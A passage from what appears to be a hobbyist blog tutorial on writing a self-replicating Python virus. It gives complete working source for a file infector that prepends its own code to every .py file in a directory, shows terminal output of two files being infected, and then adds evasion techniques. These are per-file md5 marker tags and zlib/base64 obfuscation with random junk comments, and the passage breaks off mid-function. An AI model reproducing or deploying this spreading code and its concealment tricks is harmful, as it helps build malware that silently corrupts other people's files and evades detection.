<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">42</span>        <span style=color:#ff79c6>if</span> <span style=color:#f1fa8c>&#34;# end-virus</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span> <span style=color:#ff79c6>in</span> line:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">43</span>            virus_code_on <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>False</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">44</span>            <span style=color:#ff79c6>break</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">45</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">46</span>    <span style=color:#ff79c6>return</span> virus_code
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">47</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">48</span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>summon_chaos</span>():
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">49</span>    <span style=color:#6272a4># the virus payload</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">50</span>    <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>&#34;We are sick, fucked up and complicated</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>We are chaos, we can&#39;t be cured&#34;</span>)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">51</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">52</span><span style=color:#6272a4># entry point </span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">53</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">54</span><span style=color:#ff79c6>try</span>:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">55</span>    <span style=color:#6272a4># retrieve the virus code from the current infected script</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">56</span>    virus_code <span style=color:#ff79c6>=</span> get_virus_code() 
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">57</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">58</span>    <span style=color:#6272a4># look for other files to infect</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">59</span>    <span style=color:#ff79c6>for</span> file <span style=color:#ff79c6>in</span> find_files_to_infect():
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">60</span>        infect(file, virus_code)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">61</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">62</span>    <span style=color:#6272a4># call the payload</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">63</span>    summon_chaos()
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">64</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">65</span><span style=color:#6272a4># except:</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">66</span><span style=color:#6272a4>#     pass</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">67</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">68</span><span style=color:#ff79c6>finally</span>:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">69</span>    <span style=color:#6272a4># delete used names from memory</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">70</span>    <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>list</span>(<span style=color:#8be9fd;font-style:italic>globals</span>()<span style=color:#ff79c6>.</span>keys()):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">71</span>        <span style=color:#ff79c6>if</span>(i[<span style=color:#bd93f9>0</span>] <span style=color:#ff79c6>!=</span> <span style=color:#f1fa8c>&#39;_&#39;</span>):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">72</span>            exec(<span style=color:#f1fa8c>&#39;del </span><span style=color:#f1fa8c>{}</span><span style=color:#f1fa8c>&#39;</span><span style=color:#ff79c6>.</span>format(i))
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">73</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">74</span>    <span style=color:#ff79c6>del</span> i
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">75</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">76</span><span style=color:#6272a4># end-virus</span>
</code></pre></div><p>Let&rsquo;s try it putting this virus in a directory with just another <code>.py</code> file and let see if the infection starts. Our victim will be a simple program named <code>[numbers.py](http://numbers.py)</code> that returns some random numbers, like this:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span> <span style=color:#6272a4># numbers.py</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span style=color:#ff79c6>import</span> random
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span>random<span style=color:#ff79c6>.</span>seed()
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7</span><span style=color:#ff79c6>for</span> _ <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>10</span>):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">8</span>  <span style=color:#8be9fd;font-style:italic>print</span> (random<span style=color:#ff79c6>.</span>randint(<span style=color:#bd93f9>0</span>,<span style=color:#bd93f9>100</span>))
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">9</span>
</code></pre></div><p>When this program is executed it returns 10 numbers between 0 and 100, super useful! LOL!</p><p>Now, in the same directory, I have my virus. Let&rsquo;s execute it:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span>/playgrounds/python/first ❯ python ./first.py                                                                          02:30:42 PM
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span>We are sick, fucked up and complicated
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span>We are chaos, we can&#39;t be cured
</code></pre></div><p>As you can see, our virus has started and has executed the payload. Everything is fine, but what happened to our <code>[numbers.py](http://numbers.py)</code> file? It should be the victim of the infection, so let&rsquo;s see its code now.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span style=color:#6272a4># begin-virus</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span style=color:#ff79c6>import</span> glob
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>find_files_to_infect</span>(directory <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;.&#34;</span>):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span>    <span style=color:#ff79c6>return</span> [file <span style=color:#ff79c6>for</span> file <span style=color:#ff79c6>in</span> glob<span style=color:#ff79c6>.</span>glob(<span style=color:#f1fa8c>&#34;*.py&#34;</span>)]
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_content_of_file</span>(file):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span>    data <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>None</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span>    <span style=color:#ff79c6>with</span> <span style=color:#8be9fd;font-style:italic>open</span>(file, <span style=color:#f1fa8c>&#34;r&#34;</span>) <span style=color:#ff79c6>as</span> my_file:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span>        data <span style=color:#ff79c6>=</span> my_file<span style=color:#ff79c6>.</span>readlines()
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span>    <span style=color:#ff79c6>return</span> data
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_content_if_infectable</span>(file):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span>    data <span style=color:#ff79c6>=</span> get_content_of_file(file)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span>    <span style=color:#ff79c6>for</span> line <span style=color:#ff79c6>in</span> data:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span>        <span style=color:#ff79c6>if</span> <span style=color:#f1fa8c>&#34;# begin-virus&#34;</span> <span style=color:#ff79c6>in</span> line:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span>            <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>None</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span>    <span style=color:#ff79c6>return</span> data
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>infect</span>(file, virus_code):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span>    <span style=color:#ff79c6>if</span> (data<span style=color:#ff79c6>:=</span>get_content_if_infectable(file)):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span>        <span style=color:#ff79c6>with</span> <span style=color:#8be9fd;font-style:italic>open</span>(file, <span style=color:#f1fa8c>&#34;w&#34;</span>) <span style=color:#ff79c6>as</span> infected_file:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span>            infected_file<span style=color:#ff79c6>.</span>write(<span style=color:#f1fa8c>&#34;&#34;</span><span style=color:#ff79c6>.</span>join(virus_code))
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span>            infected_file<span style=color:#ff79c6>.</span>writelines(data)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_virus_code</span>():
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span>    virus_code_on <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>False</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span>    virus_code <span style=color:#ff79c6>=</span> []
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span>    code <span style=color:#ff79c6>=</span> get_content_of_file(__file__)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span>    <span style=color:#ff79c6>for</span> line <span style=color:#ff79c6>in</span> code:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span>        <span style=color:#ff79c6>if</span> <span style=color:#f1fa8c>&#34;# begin-virus</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span> <span style=color:#ff79c6>in</span> line:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span>            virus_code_on <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>True</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">39</span>        <span style=color:#ff79c6>if</span> virus_code_on:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">40</span>            virus_code<span style=color:#ff79c6>.</span>append(line)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">41</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">42</span>        <span style=color:#ff79c6>if</span> <span style=color:#f1fa8c>&#34;# end-virus</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span> <span style=color:#ff79c6>in</span> line:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">43</span>            virus_code_on <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>False</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">44</span>            <span style=color:#ff79c6>break</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">45</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">46</span>    <span style=color:#ff79c6>return</span> virus_code
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">47</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">48</span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>summon_chaos</span>():
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">49</span>    <span style=color:#6272a4># the virus payload</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">50</span>    <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>&#34;We are sick, fucked up and complicated</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>We are chaos, we can&#39;t be cured&#34;</span>)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">51</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">52</span><span style=color:#6272a4># entry point </span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">53</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">54</span><span style=color:#ff79c6>try</span>:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">55</span>    <span style=color:#6272a4># retrieve the virus code from the current infected script</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">56</span>    virus_code <span style=color:#ff79c6>=</span> get_virus_code() 
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">57</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">58</span>    <span style=color:#6272a4># look for other files to infect</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">59</span>    <span style=color:#ff79c6>for</span> file <span style=color:#ff79c6>in</span> find_files_to_infect():
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">60</span>        infect(file, virus_code)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">61</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">62</span>    <span style=color:#6272a4># call the payload</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">63</span>    summon_chaos()
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">64</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">65</span><span style=color:#6272a4># except:</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">66</span><span style=color:#6272a4>#     pass</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">67</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">68</span><span style=color:#ff79c6>finally</span>:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">69</span>    <span style=color:#6272a4># delete used names from memory</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">70</span>    <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>list</span>(<span style=color:#8be9fd;font-style:italic>globals</span>()<span style=color:#ff79c6>.</span>keys()):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">71</span>        <span style=color:#ff79c6>if</span>(i[<span style=color:#bd93f9>0</span>] <span style=color:#ff79c6>!=</span> <span style=color:#f1fa8c>&#39;_&#39;</span>):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">72</span>            exec(<span style=color:#f1fa8c>&#39;del </span><span style=color:#f1fa8c>{}</span><span style=color:#f1fa8c>&#39;</span><span style=color:#ff79c6>.</span>format(i))
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">73</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">74</span>    <span style=color:#ff79c6>del</span> i
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">75</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">76</span><span style=color:#6272a4># end-virus</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">77</span><span style=color:#6272a4># numbers.py</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">78</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">79</span><span style=color:#ff79c6>import</span> random
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">80</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">81</span>random<span style=color:#ff79c6>.</span>seed()
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">82</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">83</span><span style=color:#ff79c6>for</span> _ <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>10</span>):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">84</span>  <span style=color:#8be9fd;font-style:italic>print</span> (random<span style=color:#ff79c6>.</span>randint(<span style=color:#bd93f9>0</span>,<span style=color:#bd93f9>100</span>))
</code></pre></div><p>And as expected, now we have our virus before the real code.</p><p>Let&rsquo;s create another <code>.py</code> file in the same directory, just a simple &ldquo;hello world&rdquo; program:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span>/playgrounds/python/first ❯ <span style=color:#8be9fd;font-style:italic>echo</span> <span style=color:#f1fa8c>&#39;print(&#34;hello world&#34;)&#39;</span> &gt; hello.py
</code></pre></div><p>and now, let&rsquo;s execute the <code>[numbers.py](http://numbers.py)</code> program:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span>/playgrounds/python/first ❯ python numbers.py                                                                          02:35:12 PM
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span>We are sick, fucked up and complicated
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span>We are chaos, we can&#39;t be cured
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span style=color:#bd93f9>35</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span style=color:#bd93f9>43</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span style=color:#bd93f9>89</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span style=color:#bd93f9>37</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span style=color:#bd93f9>92</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span style=color:#bd93f9>71</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span style=color:#bd93f9>4</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span style=color:#bd93f9>21</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span style=color:#bd93f9>83</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span style=color:#bd93f9>47</span>
</code></pre></div><p>As you can see, the program still does whatever it was expected to do (extract some random numbers) but only after having executed our virus, which has spread to other <code>*.py</code> files in the same directory and has executed the payload function. Now, if you look at the <code>[hello.py](http://hello.py)</code> file, you will see that it has been infected as well, as we can see running it:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span>/playgrounds/python/first ❯ python hello.py                                                                            02:40:01 PM
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span>We are sick, fucked up and complicated
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span>We are chaos, we can&#39;t be cured
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span>hello world
</code></pre></div><h2 id=trying-to-hide-the-virus-code-a-little-more>Trying to hide the virus code a little more</h2><p>Now, even if this virus could be potentially dangerous, it is easily detectable. You don&rsquo;t have to be Sherlock Holmes to recognize a virus that is written in plain text and starts with <code># begin-virus</code>, right?</p><p>So what can we do to make it a little harder to find?</p><p>Not much more, since we&rsquo;re writing it in Python and Python is an interpreted language&mldr; however, maybe we can still do something.</p><p>For example, wouldn&rsquo;t it be better if we could consider as infected any single file that contains the md5 hash of its name as a comment?</p><p>Our virus could start with something like <code># begin-78ea1850f48d1c1802f388db81698fd0</code> and end with something like <code># end-78ea1850f48d1c1802f388db81698fd0</code> and that would be different for any infected file, making it more difficult to find all the infected files on the system.</p><p>So our <code>get_content_if_infectable()</code> function could be modified like this:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_content_if_infectable</span>(file, <span style=color:#8be9fd;font-style:italic>hash</span>):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span>    <span style=color:#6272a4># return the content of a file only if it hasn&#39;t been infected yet</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span>  data <span style=color:#ff79c6>=</span> get_content_of_file(file)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span>  <span style=color:#ff79c6>for</span> line <span style=color:#ff79c6>in</span> data:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span>    <span style=color:#ff79c6>if</span> <span style=color:#8be9fd;font-style:italic>hash</span> <span style=color:#ff79c6>in</span> line:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7</span>      <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>None</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">8</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">9</span>  <span style=color:#ff79c6>return</span> data
</code></pre></div><p>Obviously, before calling it you should calculate the hash of the file you&rsquo;re going to infect like this:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span style=color:#8be9fd;font-style:italic>hash</span> <span style=color:#ff79c6>=</span> hashlib<span style=color:#ff79c6>.</span>md5(file<span style=color:#ff79c6>.</span>encode(<span style=color:#f1fa8c>&#34;utf-8&#34;</span>))<span style=color:#ff79c6>.</span>hexdigest()
</code></pre></div><p>and also the <code>get_virus_code()</code> function should be modified to look for the current script hash:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_virus_code</span>():
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span>  <span style=color:#6272a4># open the current file and returns the virus code, that is the code between the</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span>  <span style=color:#6272a4># begin-{hash} and the end-{hash} tags</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span>  virus_code_on <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>False</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span>  virus_code <span style=color:#ff79c6>=</span> []
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span>  virus_hash <span style=color:#ff79c6>=</span> hashlib<span style=color:#ff79c6>.</span>md5(os<span style=color:#ff79c6>.</span>path<span style=color:#ff79c6>.</span>basename(__file__)<span style=color:#ff79c6>.</span>encode(<span style=color:#f1fa8c>&#34;utf-8&#34;</span>))<span style=color:#ff79c6>.</span>hexdigest()
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span>  code <span style=color:#ff79c6>=</span> get_content_of_file(__file__)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span>  <span style=color:#ff79c6>for</span> line <span style=color:#ff79c6>in</span> code:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span>    <span style=color:#ff79c6>if</span> <span style=color:#f1fa8c>&#34;# begin-&#34;</span> <span style=color:#ff79c6>+</span> virus_hash <span style=color:#ff79c6>in</span> line:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span>      virus_code_on <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>True</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span>    <span style=color:#ff79c6>if</span> virus_code_on:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span>      virus_code<span style=color:#ff79c6>.</span>append(line <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span>)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span>    <span style=color:#ff79c6>if</span> <span style=color:#f1fa8c>&#34;# end-&#34;</span> <span style=color:#ff79c6>+</span> virus_hash <span style=color:#ff79c6>in</span> line:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span>      virus_code_on <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>False</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span>      <span style=color:#ff79c6>break</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span>  <span style=color:#ff79c6>return</span> virus_code
</code></pre></div><p>And what about our virus source code? Can it be obfuscated somehow to be a little less easy to spot?</p><p>Well, we could try to obscure it by making it different every time we infect a new file, then we can compress it by using the <code>zlib</code> library and converting it in <code>base64</code> format. We could just pass our plain text virus to a new <code>transform_and_obscure_virus_code()</code> function like this:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>obscure</span>(data: <span style=color:#8be9fd;font-style:italic>bytes</span>) <span style=color:#ff79c6>-&gt;</span> <span style=color:#8be9fd;font-style:italic>bytes</span>:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span>    <span style=color:#6272a4># obscure a stream of bytes compressing it and encoding it in base64</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span>    <span style=color:#ff79c6>return</span> base64<span style=color:#ff79c6>.</span>urlsafe_b64encode(zlib<span style=color:#ff79c6>.</span>compress(data, <span style=color:#bd93f9>9</span>))
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>transform_and_obscure_virus_code</span>(virus_code):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span>    <span style=color:#6272a4># transforms the virus code adding some randomic contents, compressing it and converting it in base64</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span>  new_virus_code <span style=color:#ff79c6>=</span> []
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span>  <span style=color:#ff79c6>for</span> line <span style=color:#ff79c6>in</span> virus_code:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span>    new_virus_code<span style=color:#ff79c6>.</span>append(<span style=color:#f1fa8c>&#34;# &#34;</span><span style=color:#ff79c6>+</span> <span style=color:#8be9fd;font-style:italic>str</span>(random<span style=color:#ff79c6>.</span>randrange(<span style=color:#bd93f9>1000000</span>))<span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span>)
